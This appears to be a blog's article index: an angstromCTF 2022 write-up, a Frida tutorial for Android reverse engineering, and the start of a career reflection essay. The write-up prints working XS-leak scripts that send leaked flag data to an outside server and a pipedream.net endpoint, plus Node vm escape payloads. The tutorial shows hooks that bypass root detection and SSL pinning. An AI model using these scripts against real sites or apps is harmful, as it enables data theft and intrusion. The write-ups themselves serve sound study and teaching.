misc&#x2F;CaaSio PSE (I may write about another challenge that involves DOMPurify + marked bypass XSS in the future) web&#x2F;SustenanceThis is a very simple App: const express = require(\"express\"); const cookieParser = require(\"cookie-parser\"); const path = require(\"path\"); const app = express(); app.use(express.urlencoded(&#123; extended: false &#125;)); // environment config const port = Number(process.env.PORT) || 8080; const adminSecret = process.env.ADMIN_SECRET || \"secretpw\"; const flag = process.env.FLAG || \"actf&#123;someone_is_going_to_submit_this_out_of_desperation&#125;\"; function queryMiddleware(req, res, next) &#123; res.locals.search = req.cookies.search || \"the quick brown fox jumps over the lazy dog\"; // admin is a cool kid if (req.cookies.admin === adminSecret) &#123; res.locals.search = flag; &#125; next(); &#125; app.use(cookieParser()); app.get(\"/\", (req, res) => &#123; res.sendFile(path.join(__dirname, \"index.html\")); &#125;); app.post(\"/s\", (req, res) => &#123; if (req.body.search) &#123; for (const [name, val] of Object.entries(req.body)) &#123; res.cookie(name, val, &#123; httpOnly: true &#125;); &#125; &#125; res.redirect(\"/\"); &#125;); app.get(\"/q\", queryMiddleware, (req, res) => &#123; const query = req.query.q || \"h\"; // h let status; if (res.locals.search.includes(query)) &#123; status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; &#125; else &#123; status = \"failed\"; &#125; res.redirect( \"/?m=\" + encodeURIComponent( `your search that took place at $&#123;Date.now()&#125; has $&#123;status&#125;` ) ); &#125;); app.listen(port, () => &#123; console.log(`Server listening on port $&#123;port&#125;`); &#125;); You can set any cookie and search for certain characters in the flag. Since there is no XSS vulnerability, XS-leak is obviously involved. To exploit XS-leak, we need to observe the difference between “searched” and “not searched”. The query for searching looks like this: /q?q=actf. If the search is successful, it will redirect to /?m=your search...at 1651732982748 has success..... If the search is unsuccessful, it will redirect to /?m=your search...ar 1651732982748 has failed. The index.html file only renders the content of the m parameter in the URL, so there are two differences between success and failure: The URL is different. The content of the page is different. At first, I tried cache probing because pages that have been visited are stored in the disk cache. Therefore, by using fetch + force-cache, we can determine whether the page is in the cache based on the time difference. As for the timestamp in the URL, we can simply set a range for brute force, such as 1~1000. Due to the default SameSite&#x3D;Lax setting, we can only use top-level navigation like window.open when searching, otherwise the cookie won’t be sent. The biggest problem is that Chrome now has cache partitioning. The cache key for a newly opened page is: (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx). However, if I use fetch inside an ngrok, the cache key will be: (https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx). The cache key is different, so we can’t access the cache. My teammate and I also discussed whether we could use cookie bomb to do something since we can set cookies, but we didn’t find a way after the discussion. Then I tried to use the method from pbctf 2021 Vault to leak history using a:visited. After modifying the POC in the above article, it worked, but it didn’t work when I sent it to the admin bot. I tested it on my local machine and found that it was probably because of headless mode, where the rendering time is always 16ms regardless of how it is rendered. After trying everything I could think of, lebr0nli posted a POC that uses cache probing, which was inspired by maple’s writeup. The key point is that “this POC can be used on other challenges to run on the same site”, for example, if the URL of another challenge is https://xtra-salty-sardines.web.actf.co/, using fetch from there will also result in the same cache key (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx), because the cache key only looks at eTLD+1, so the cache key will be the same for same-site websites. But the problem he encountered was that it could run locally, but no matter what on the remote, it was always a false positive. So I followed his POC and tried to return more numbers, and found that the problem was that the server was running abnormally fast. For example, those with cache took 3ms, and those without cache only took 5ms, with a very small difference, even the timestamp part was, probably within 10ms after window.open. Therefore, I modified the code and directly calculated the average time with cache on the remote, and successfully leaked the flag. The code is as follows: https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722 // to hang the connection fetch('https://deelay.me/20000/https://example.com') // NOTE: we will calculate this baseline before doing the attack var baseLine = 3.2 const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms)) go() async function go() &#123; await calculateBaseline() main() async function calculateBaseline() &#123; var m = Math.random() let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m) // NOTE: this number can be decreased by detecting window load await sleep(500) win.close() let total = 0 for(let i=1; i&lt;=5; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m) total += ts report(`Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; // NOTE: 0.5 is just a random guess baseLine = (total/5) + 0.5 report(`Baseline: $&#123;baseLine&#125;`) // NOTE: adjust baseline, should not be more than 3 ms based on previous testing if (baseLine > 3) &#123; baseLine = 3 &#125; for(let i=1; i&lt;=3; i++) &#123; let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m) report(`Not Cached time, round: $&#123;i&#125;, $&#123;ts&#125;ms`) &#125; &#125; // NOTE: server is quite fast so no need to set timeout async function getLoadTime(url) &#123; const start = performance.now() await fetch(url, &#123; cache: 'force-cache', mode: 'no-cors' &#125;) return performance.now() - start &#125; function genSucceedUrl(t) &#123; let ft = t + '' while(ft.length &lt; 13) &#123; ft += '0' &#125; const status = \"succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance\"; return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at $&#123;ft&#125; has $&#123;status&#125;`); &#125; async function isCached(str) &#123; let start = +new Date() let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str)) await sleep(500) win.close() // NOTE: base on the data collected, i should be 1~20, pretty small number for(let i=1; i&lt;=30; i++) &#123; const url = genSucceedUrl(start + i) let loadTime = await getLoadTime(url) if (loadTime &lt;= baseLine) &#123; // NOTE: check again to see if it really meets the condition let total = 0 for(let j=1; j&lt;=3; j++) &#123; total += await getLoadTime(url) &#125; total/=3 if (total &lt;= baseLine) &#123; report(`isCached success, str=$&#123;str&#125;, i=$&#123;i&#125;, start=$&#123;start&#125;, total=$&#123;total&#125;`) return true &#125; &#125; &#125; return false &#125; async function main() &#123; let flag = 'actf&#123;yummy_' // NOTE: we can leak the charset first to speed up the process let chars = 'acefsmntuy_&#125;'.split('') while(flag[flag.length - 1] !== '&#125;') &#123; for(let char of chars) &#123; report('trying:' + flag + char) if (await isCached(flag + char)) &#123; flag += char report('flag:' + flag) break &#125; &#125; &#125; &#125; async function report(data) &#123; console.log(data) // TODO: change to your VPS return fetch('https://YOUR_VPS/', &#123; method: 'POST', body: data, mode: 'no-cors' &#125;).catch(err => err); &#125; &#125; We can first leak the charset, and the speed will be much faster. There are still some small adjustments that can be made above, and the overall speed should be faster. Later, my teammate also posted another writeup: UIUCTF 2021- yana, which revealed that headless chrome currently does not have cache partitioning. I actually tested it myself and found that it is still the same now, so this question does not actually need to borrow from other questions, and you can set up an ngrok to solve it. Expected SolutionThe expected solution should be the cookie bomb I mentioned above. First, set a lot of cookies, and then use the feature that the successful and failed URLs are different. If successful, the URL will be longer, the request will be too large, and the server will return an error. If it fails, nothing will happen. The script below comes from Strellic and also needs to be used in other questions to run on the same site: &lt;>'\";&lt;form action='https://sustenance.web.actf.co/s' method=POST>&lt;input id=f />&lt;input name=search value=a />&lt;/form> &lt;script> const $ = document.querySelector.bind(document); const sleep = (ms) => new Promise(r => setTimeout(r, ms)); let i = 0; const stuff = async (len=3500) => &#123; let name = Math.random(); $(\"form\").target = name; let w = window.open('', name); $(\"#f\").value = \"_\".repeat(len); $(\"#f\").name = i++; $(\"form\").submit(); await sleep(100); &#125;; const isError = async (url) => &#123; return new Promise(r => &#123; let script = document.createElement('script'); script.src = url; script.onload = () => r(false); script.onerror = () => r(true); document.head.appendChild(script); &#125;); &#125; const search = (query) => &#123; return isError(\"https://sustenance.web.actf.co/q?q=\" + encodeURIComponent(query)); &#125;; const alphabet = \"etoanihsrdluc_01234567890gwyfmpbkvjxqz&#123;&#125;ETOANIHSRDLUCGWYFMPBKVJXQZ\"; const url = \"//en4u1nbmyeahu.x.pipedream.net/\"; let known = \"actf&#123;\"; window.onload = async () => &#123; navigator.sendBeacon(url + \"?load\"); await Promise.all([stuff(), stuff(), stuff(), stuff()]); await stuff(1600); navigator.sendBeacon(url + \"?go\"); while (true) &#123; for (let c of alphabet) &#123; let query = known + c; if (await search(query)) &#123; navigator.sendBeacon(url, query); known += c; break; &#125; &#125; &#125; &#125;; &lt;/script> There are a few details to note here: If the request is too large, the server will return an error. Because it is the same site, the &lt;script&gt; will automatically bring cookies when sending requests. Use the event of the script to detect whether the http status code is successful. The reason why I was stuck at the beginning was: I didn’t expect to use other questions to bypass the same site cookie. I didn’t notice that the request URL was also included in the length, and only thought of the header&#x2F;body. misc&#x2F;CaaSio PSEThis question is a very strict js jail, and the question looks like this: #!/usr/local/bin/node // flag in ./flag.txt const vm = require(\"vm\"); const readline = require(\"readline\"); const interface = readline.createInterface(&#123; input: process.stdin, output: process.stdout, &#125;); interface.question( \"Welcome to CaaSio: Please Stop Edition! Enter your calculation:\\n\", function (input) &#123; interface.close(); if ( input.length &lt; 215 &amp;&amp; /^[\\x20-\\x7e]+$/.test(input) &amp;&amp; !/[.\\[\\]&#123;&#125;\\s;`'\"\\\\_&lt;>?:]/.test(input) &amp;&amp; !input.toLowerCase().includes(\"import\") ) &#123; try &#123; const val = vm.runInNewContext(input, &#123;&#125;); console.log(\"Result:\"); console.log(val); console.log( \"See, isn't the calculator so much nicer when you're not trying to hack it?\" ); &#125; catch (e) &#123; console.log(\"your tried\"); &#125; &#125; else &#123; console.log( \"Third time really is the charm! I've finally created an unhackable system!\" ); &#125; &#125; ); The VM bypass part is very simple, and this.constructor.constructor(&#39;return ...&#39;)() can be used to solve it, but the difficulty lies in the fact that many characters are restricted, and string-related ones cannot be used, and . and [] are also not allowed, and &#123; &#125;;&gt; are also not allowed, which blocked many things. After trying for a while, I remembered that with can also be used to access properties, like this: with(console)log(123) The string part can be bypassed using regexp, like this: /string/.source. While doing it, I thought of whether decodeURI could be used to bypass some characters, but I didn’t think about it carefully. After the game, I found that many people used this trick to solve it, such as lebr0nli: eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))() If the regexp is directly converted to a string, there will be two / before and after. Just add /\\n inside the regexp, and it will be combined with the previous one to become like this: // your_code_here The concept is actually quite similar to the XSS challenge I previously created. Anyway, the payload framework I finally assembled looks like this: with(/console.log(1)/)with(this)with(constructor)constructor(source)() Just change console.log(1) to the code you want to run, and the code we want to run is: return String(process.mainModule.require('fs').readFileSync('flag.txt')) The step of converting to a string is not necessary, it just makes the flag more readable. Then you can use with to convert the above code to: with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt'))) Since single quotes are not allowed, we can make them variables for better readability and then figure out how to remove them later: with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n))) Now we just need to generate the string, which can be done using String.fromCharCode: with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule)with(require(k))return(String(readFileSync(n))) // Same as above Therefore, the final payload is to concatenate this code with the framework from earlier. I’ll format it for better readability: with( /with(String) with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process) with(mainModule) with(require(k)) return(String(readFileSync(n))) /) with(this) with(constructor) constructor(source)() After seeing Maple’s payload, I realized that the nested with can be bypassed using with(a=source,/b/). For example: with(/a/)with(/b/)console.log(source) You can only get /b/.source, not a, because the properties have the same name. So you can write it like this: with(/a/)with(a=source,/b/)console.log(a,source) Use a=source in the second with to get the property from the previous with. In addition to with, it also uses the magical built-in module require(&#39;repl&#39;).start(), which basically opens the repl mode and allows you to execute whatever you want, bypassing character restrictions. Here’s the payload: with(/with(process)with(mainModule)with(require(x))start()/) with(s1=source,/x/) with(s2=source,/repl/) with(s3=source,this) with(constructor) constructor(s2,s1)(s3) The author’s solution is as follows, without using regexp: with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))()) with(mainModule) with(require(f(102,s))) readFileSync(f(102,108,97,103,46,t,120,t)) This solution uses a bunch of temporary variables to save characters, which is also clever. Combining it with Maple’s solution, it becomes: with(String) with(f=fromCharCode,this) with(constructor) with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))()) with(mainModule) with(require(f(r,e,p,108))) start() Although many people like to use this.constructor.constructor, understanding the principle will reveal that the first constructor is just for getting the function, so you can check what’s on the object: for(let key of Object.getOwnPropertyNames((obj=&#123;&#125;).__proto__)) &#123; if (typeof obj[key] === 'function') &#123; console.log(key) &#125; &#125; The shortest one is valueOf, so it can be further shortened to: with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start() A total of 177 characters. If combined with fredd’s solution in Discord, which uses regexp, the shortest one I found is 115 characters: eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))","link":"/2022/05/05/en/angstrom-ctf-2022-writeup/"},{"title":"Android App Reverse Engineering Part 4: Dynamic Analysis with Frida","text":"In the previous articles, we talked about static analysis, which means we didn’t actually run the app. Instead, we studied the logic of the app’s operation through decompiled code and modified the code before repackaging and executing it. Dynamic analysis, on the other hand, means that we will run the app and use various methods to hook various methods to monitor the input and output of certain methods, and even tamper with them. In this article, let’s learn how to use Frida for dynamic analysis. Series links: Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs Android App Reverse Engineering Part 2: Modifying Smali Code Android App Reverse Engineering Part 3: Monitoring App Packets Android App Reverse Engineering Part 4: Dynamic Analysis with Frida Tool Introduction: FridaThe dynamic analysis tool we will be using this time is Frida. The official website describes it as a “Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.” It can be used for dynamic analysis on not only Android but also other platforms. There is a tool called Objection that is based on Frida, and it is recommended to install it directly because it will also install Frida. Installation instructions can be found here: https://github.com/sensepost/objection/wiki/Installation To use Frida, it must be installed on both the phone and the computer. Installation instructions can be found on the official website: https://frida.re/docs/installation/ Also, if you have Frida installed on your phone but are switching to a different computer, make sure to install the same version. The steps are: Check the version of Frida on your phone: frida-server --version, assuming it is 15.1.14. Find the version number of frida-tools here: https://github.com/frida/frida/releases/tag/15.1.14 Install these two on your computer: pip install frida&#x3D;&#x3D;15.1.14 pip install frida-tools&#x3D;&#x3D;10.4.1 Make sure the version numbers match, or you will encounter errors. Although Frida may seem like it requires root access, there are actually two ways to run it: one that requires root access and one that does not. To use the version that requires root access, install frida-server on your phone. Details can be found on the official website: https://frida.re/docs/android/ Basically, you just need to run an executable on your phone with root privileges. If it is not the default root when you run the file, you can use adb shell to change it: adb shell # kill old process ps -e | grep frida-server kill -9 &#123;your_process_id&#125; # run as root su /data/local/tmp/frida-server &amp; After running it, you can use frida-ps -U to confirm that it is running. The second method, which does not require root access, involves modifying the APK. You add a Frida so file to the APK and add a line of System.loadLibrary() at the entry point to use Frida. Details can be found in the wiki: https://github.com/sensepost/objection/wiki/Patching-Android-Applications You don’t need to execute the above process yourself; there are ready-made commands to help you. If you can’t package it, you can use this command: objection patchapk --source test.apk --skip-resources --ignore-nativelibs If it still doesn’t work, you can use the knowledge we learned earlier to modify it yourself. First, use apktool d to unpack the packaged APK, then modify the contents yourself. For example, sometimes there may be an alignment issue with the so file, so you can change android:extractNativeLibs in AndroidManifest.xml to true and then repack it. Basic Usage of FridaFirst, let’s talk about what Frida does. The most common use case is to write some code to hook functions. Hooking means that you can override the implementation of any function, observe input and output, and change the return value of the function. These codes are written in JavaScript and injected into the app when it is launched. In my experience, after seeing more examples, it is quite easy to get started. Instead of talking so much, let’s try it out. The sample app used this time is the same as the first article, which is an app that checks whether the device is rooted after pressing a button: https://github.com/aszx87410/demo/raw/master/android/demoapp.apk After opening this app, the default activity will be com.cymetrics.demo/MainActivity. Let’s hook the onCreate method of this class. First, create a file named script.js with the following content: function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.implementation = function() &#123; console.log('MainActivity onCreate') &#125; &#125;) &#125; setImmediate(run) Then run the command: frida -U --no-pause -l script.js -f \"com.cymetrics.demo\" If you don’t have root, the startup method will be different. First, patch the app as mentioned above, then install it on your phone, and then enter the following command in the terminal: frida -U Gadget -l script.js Then you should see a new log line on your terminal, which is MainActivity onCreate, and the app on your phone crashes. This is normal. Let’s briefly talk about the basic structure of Frida scripts. The starting point is: function run() &#123; Java.perform(() => &#123; // code &#125;) &#125; setImmediate(run) Then it depends on what method you want to hook. In our previous code, we first use Java.use to get the class we want to hook, and then use MainActivity.onCreate.implementation to replace the original implementation with our own function. Why did the app crash after hooking? Because the function we implemented ourselves did nothing except log, which means that everything the original onCreate should have done was removed, so the crash is reasonable. To find out the root cause of the crash, you can use adb logcat | grep AndroidRuntime: android.util.SuperNotCalledException: Activity &#123;com.cymetrics.demo/com.cymetrics.demo.MainActivity&#125; did not call through to super.onCreate() So what should we do? Just remember to call the original implementation at the end, like this: function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.implementation = function() &#123; console.log('MainActivity onCreate') this.onCreate.call(this) &#125; &#125;) &#125; setImmediate(run) this will be the original MainActivity, and this.onCreate.call can call the original implementation, with the first parameter of the call method being this, followed by the parameters. After executing the above script, another error will appear: Error: onCreate(): argument types do not match any of: .overload('android.os.Bundle') This is because onCreate should actually have parameters, but we did not receive any parameters when we overrode it, so an error occurred. To avoid this problem, I would recommend adding .overload() at the beginning when overriding the implementation, like this: MainActivity.onCreate.overload().implementation = function() &#123; &#125; Frida will then show an error message again to tell you what the correct parameters should be, so you can follow it. Finally, it will look like this: function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.overload('android.os.Bundle').implementation = function(a) &#123; console.log('MainActivity onCreate') this.onCreate.call(this, a) &#125; &#125;) &#125; setImmediate(run) In this way, you can know what the parameters are, and you can also pass in parameters when calling the original implementation, so there will be no errors. Since we can insert code, we can do a lot of things, such as displaying a new message directly on the UI: function run() &#123; Java.perform(() => &#123; var MainActivity = Java.use('com.cymetrics.demo.MainActivity') MainActivity.onCreate.overload('android.os.Bundle').implementation = function(a) &#123; console.log('MainActivity onCreate') // Toast should be run on the main thread(UI thread) Java.scheduleOnMainThread(function() &#123; var Toast = Java.use(\"android.widget.Toast\"); var currentApplication = Java.use('android.app.ActivityThread').currentApplication(); // We need context for displaying the Toast var context = currentApplication.getApplicationContext(); Toast.makeText( context, // The type should be correct Java.use(\"java.lang.String\").$new(\"Hello!\"), Toast.LENGTH_SHORT.value ).show(); &#125;); this.onCreate.call(this, a) &#125; &#125;) &#125; setImmediate(run) Code from: makeToast.js. Bypassing Root Detection with FridaIn our previous article, we bypassed root detection by directly modifying the smali code and patching the function that performs the detection. With Frida, we don’t need to modify the smali code anymore. We can directly hook the function that performs the detection and replace its implementation, like this: function run() &#123; Java.perform(() => &#123; var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer') RootBeer.isRooted.overload().implementation = function()&#123; console.log('bypass rootbeer') return false &#125;; &#125;) &#125; setImmediate(run) Yes, it’s that easy. You may ask, how do we know to hook this function? This part still requires static analysis. From static analysis, we know that this function is doing a check, so we use Frida to hook this function. For myself, I usually use two methods in combination. First, I disassemble and statically analyze the code, take a quick look at the code, and then use Frida to hook it to see if I can achieve what I want. If I can, I will go to the corresponding place in smali and then repack the app. This way, I can execute the process I want even on a phone without Frida. In fact, the basic use of Frida is like this. The rest depends on understanding of the code and Android development to determine which function to hook. Other Frida TipsBelow are some Frida tips that I found on the internet and have used in practice for your reference. Print stack traceSuppose an app has a check mechanism that detects whether it has root, and the source code is obfuscated, making it difficult to trace. However, when checking, it will output check-related information using Log.d. At this time, we can hook Log.d and use Log.getStackTraceString to output the stack trace to know where this function is called: var Log = Java.use(\"android.util.Log\"); var Exception = Java.use(\"java.lang.Exception\"); Log.d.overload(\"java.lang.String\", \"java.lang.String\").implementation = function (a, b) &#123; if (b.indexOf('root') >= 0) &#123; // print stack trace console.log(Log.getStackTraceString( Exception.$new())); &#125; return this.d.overload(\"java.lang.String\", \"java.lang.String\").call(this, a, b) &#125;; Hook Reflect-related methodsIn Java, in addition to calling methods directly, you can also call them through reflection (Reflect). Some obfuscated programs use this technique extensively to enhance the difficulty of static analysis. We can print out every dynamically called method to see if there are any clues: // hook Class.forName var JavaClass = Java.use('java.lang.Class'); JavaClass.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader').implementation = function(name, b, c) &#123; console.log('Class.forName', name) // we can log all methods in certain class if (name.indexOf('cymetrics') === 0) &#123; var TargetClass = Java.use(name); var methodsList = TargetClass.class.getDeclaredMethods(); for (var k=0; k&lt;methodsList.length; k++)&#123; console.log(methodsList[k].getName()); &#125; &#125; return this.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader').call(this, name, b, c) &#125; // hook Method.invoke var Method = Java.use('java.lang.reflect.Method') Method.invoke.overload('java.lang.Object', '[Ljava.lang.Object;').implementation = function(a,b)&#123; console.log('reflect', a, b) return this.invoke.call(this,a,b) &#125; Hook string operationsSome obfuscated programs will scramble all the fixed strings in the program through various steps to make them difficult to search, such as turning strings into numbers and then restoring them. Usually, when restoring, string operations will be performed. At this time, we can directly hook the string operations and use the stack trace mentioned earlier to trace: ['java.lang.StringBuilder', 'java.lang.StringBuffer'].forEach(function(clazz, i) &#123; Java.use(clazz)['toString'].implementation = function() &#123; var ret = this.toString(); console.log('ret:', ret) return ret; &#125; &#125;); Hook encryption and decryption-related operationsUsually, in an Android app, if you want to perform encryption and decryption, you will use the built-in API, like this (source: AES encryption in Android–Part 1): public static final String CODE_TYPE = \"UTF-8\"; public static final String AES_TYPE = \"AES/ECB/PKCS5Padding\"; private static final String AES_KEY=\"1111222233334444\"; public static String encrypt(String cleartext) &#123; try &#123; SecretKeySpec key = new SecretKeySpec(AES_KEY.getBytes(), \"AES\"); Cipher cipher = Cipher.getInstance(AES_TYPE); cipher.init(Cipher.ENCRYPT_MODE, key); byte[] encryptedData = cipher.doFinal(cleartext.getBytes(CODE_TYPE)); return Base64.encodeToString(encryptedData,Base64.DEFAULT); &#125; catch (Exception e) &#123; e.printStackTrace(); return \"\"; &#125; &#125; Therefore, as long as you can hook methods like SecretKeySpec or doFinal, you can intercept the key and plaintext before encryption. This article is worth reading: How Secure is your Android Keystore Authentication?, which includes a bunch of Frida scripts related to encryption and decryption. Here: https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js By the way, the script does not directly convert byte arrays to strings. Here is a more convenient way (source: frida小技巧之string与byte转化): function bytesToString(bytes) &#123; var javaString = Java.use('java.lang.String'); return javaString.$new(bytes); &#125; var Base64 = Java.use('android.util.Base64') Base64.decode.overload('[B', 'int').implementation = function(a, b) &#123; console.log(bytesToString(a)) return this.decode.call(this, a, b) &#125; SSL PinningI saw a great script in Defeating Android Certificate Pinning with Frida that automatically hooks various functions that do SSL pinning, allowing you to bypass this mechanism. I saved a copy here: https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249 After saving, run it like this: frida -U --no-pause -l ssl.js -f &quot;com.example&quot; Detecting FridaSince Frida is so powerful, some app security mechanisms naturally want to block it. Once Frida is detected, the app will either exit directly or cause a crash. You can refer to the following two articles: Android Reverse Engineering: Multiple Feature Detection of Frida Multiple Feature Detection of Frida There are many ways to anti-detection, one of which is to hook the various methods mentioned in the above articles. After all, we have root privileges and Frida hook in front, so as long as we know how it is judged, we can definitely remove the check. If you can’t find the check, you can use various hooks mentioned above to find it out step by step. ConclusionIn this article, we introduced the basic usage of Frida and learned how to use Frida to hook various methods to obtain various information we want. In the first four articles, we covered some basic things, including: Basic Android App composition How to use Apktool to unpack and repack apk How to use jadx to restore smali to java files Familiar with a little bit of smali syntax, know how to modify code and add code How to intercept packets through a proxy on a computer How to modify the apk to allow the proxy to intercept smoothly How to use Frida to hook function Various tricks of Frida If you go further, you will enter the field of native. In addition to using Java to write Android Apps, you can also use Android NDK to write code in C&#x2F;C++, which can be provided to Android apps. When do you need it? The first is the more performance-consuming places, such as image recognition, using C++ to write will be faster than Java, so native is usually used. The second is some more secretive operations, such as encryption and decryption. If placed in the Java layer, it is easy to decompile and see what is being done. If written in native, more binary-related knowledge is required to crack it. In addition, the apps in the real world are not as simple as the apps we demonstrated earlier. They may be encapsulated or more strongly obfuscated. Even if the apk can be unpacked, if the shell cannot be removed, the real logic cannot be seen. Some shells also have mechanisms for anti-tampering and anti-dynamic analysis, which can block attackers with insufficient skills. Relevant introductions can refer to the agenda of 2019 Taiwan Cyber Security Week: Building a Secure and Convenient App Security Protection Product The reason why this series is called “Introduction” is because it completely does not mention the practical things that will be encountered, and only focuses on the basics and tools of the introduction. However, for apps without special obfuscation or encapsulation, this should be enough. References: Frida Handbook Translation-N Ways to Unpack Android Malware frida hook java This is probably the most detailed notes for learning Frida frida-snippets Frida Tutorial Practical FRIDA Advanced: Memory Roaming, Hook Anywhere, Packet Capture","link":"/2023/04/27/en/android-apk-decompile-intro-4/"},{"title":"Can I be called a senior engineer after two years?","text":"PrefaceTwo years ago, I wrote this self-reflection of a junior engineer at the end of the year, mainly to review what I had learned that year and express my thoughts and feelings, and raised some questions about my career development. The reason why the title is “junior” engineer is that at that time I felt that I couldn’t even touch the edge of being a senior engineer, so I used the word “junior” to describe myself. Two years have passed, and my job title has changed from engineer to senior engineer, and even further to Front-end Team Lead. Although job titles don’t represent everything, I think they at least “represent something”. When you reach that position, you must take responsibility. If you feel that your ability is not enough, you must try your best to catch up until you can take on that responsibility. This article will first review my development in the past two years, and finally share some of my thoughts and feelings. Before that, I would like to wish all readers a happy new year! Depth of TechnologyTwo years ago, I mentioned in the article that I was a person with breadth but not depth, and I hoped that I could go deeper in the future and make my foundation more solid. And during these two years, I have indeed made progress in this direction, starting to write some more in-depth technical articles, and these articles are often inspired by work. For example, when I was warned by the security department about a CSRF vulnerability at work, I spent some time studying and wrote Let’s talk about CSRF. I also discovered a cookie problem that I was very puzzled about at about the same time, accidentally solved it, and then wrote The most difficult cookie problem I have ever encountered after understanding the problem. Different job content will also encounter different problems, such as It turns out that CORS is not as simple as I thought encountered when doing PWA and PWA practical experience sharing after completing PWA. In addition to the inspiration obtained from work, I deeply feel that my grasp of the basics of JavaScript is insufficient, and I have never understood why those common interview questions are. Although these may not necessarily be used in work, I think they are things that cannot be avoided if I want to become a senior engineer, and they must be understood. For this part, the first article I wrote was It’s time to understand the JavaScript prototype chain, which received a lot of praise. Then I wrote In-depth discussion of parameter passing in JavaScript: call by value or reference?, which summarized my opinions on this issue, and then the recent I know you understand hoisting, but how deep do you understand? and All functions are closures: talking about scope and closure in JS, which deeply studied the well-known hoisting and closure. Looking at it this way, after finishing writing about “this” (I also have a plan to write about it), I can probably handle the more common basics of JavaScript, and then it may be some issues related to type conversion. In addition to JavaScript, I also wrote several articles about the network and browser, such as Easy understanding of Ajax and cross-origin requests for beginners, Progressive understanding of HTTP Cache mechanism that I used to be confused about, and Event propagation mechanism of DOM: capture and bubble, or occasionally study newer things like Unified web payment interface: Payment Request API. Since 2015, my front-end development career has been revolving around React, so sometimes I will also write some related topics, such as React performance optimization challenge: understanding Immutable data and shouldComponentUpdate at once and Talking about React Fiber and its impact on lifecycles, or to learn RxJS in order to use redux-observable and finally write The most easy-to-understand RxJS tutorial. I have written more than 20 articles in the past two years. I want to thank the partners of TechBridge for proposing the idea of running a collaborative blog together, which forced me to write an article every month. Even though I have written so much, I know that there are still many topics that I have not covered. Even the topics I have written about may not have been fully understood. I think this is a part that writers need to be very careful about (or it can be said that it is a reminder to myself). Otherwise, if you are not careful, you will become arrogant and not realize that the world is much bigger than you think. For example, a few days ago, I saw this article: “Tencent Front-end Interview (Part 1)” which shared the author’s experience of interviewing at Tencent. There were some questions that I didn’t know how to answer, so I still have a lot to learn. In addition to not being arrogant, you also need to be careful not to underestimate yourself. However, this is super difficult. Sometimes it is difficult to find that line. I cannot say that I understand a topic 100%, but I cannot say that I do not understand it at all. After all, I have written so many topics, and I still have a certain level of understanding of what I have written. I still need to have confidence in myself. By the way, there is also a trap to be careful of, which is that many people actually know these technologies, they just haven’t posted or shared about them. I used to think that if I couldn’t find an article about something, it meant that not many people knew about it. But that’s not true. They just haven’t shared it yet, and there are still many people who know about it. Breadth of TechnologyTwo years ago, I felt that I had more breadth than depth, so I wrote a lot of articles to study different topics in depth and deepen my understanding of technology. What about breadth? After having depth, I didn’t care so much about breadth anymore. In my first job, I hadn’t decided where I wanted to go, so I wrote the backend with node.js, the frontend with react+redux, and even wrote an Android app with Java. But after that, I became a full-time frontend engineer, so I didn’t pay as much attention to backend technology. I don’t know what new trends there are, let alone mobile. I still maintain some basic sensitivity, such as knowing about new things like Flutter, but only knowing the keyword. This is actually the direction I want to go. I think it’s a good thing to be broad before going deep. You have to be broad first to find the direction you want to go, and also accumulate a basic understanding of other fields during this period, and then go deep to understand the field you choose. For me, during the breadth period, I made myself understand backend, mobile development, or some architectural things. These are all helpful for my career later on. At least I have a basic concept and won’t know nothing. Now that I have entered the depth period, I focus on JavaScript, browsers, networks, and React, and I don’t pay as much attention to other things. But if I have to choose a few topics to study outside of this, I would choose GraphQL and Vue, hoping to have a basic understanding of these two things. IntegrationAt some point, you will start to be able to integrate what you have learned before and know the context of its development. It seems that I have reached this point in the past two years. Actually, I had this ability before, but it has become more obvious recently. After mastering the context, you can explain the emergence of a technology and why to choose it clearly. You can know the core idea behind it. After such thinking, what you write is different. In addition to the development of technology depth, I also write some popular science articles for the general public, such as “How can a beginner like Xiao Ming become a frontend engineer?” and “Understanding Technical Terms with Xiao Ming: MVC, SPA, and SSR”. These are things that I have 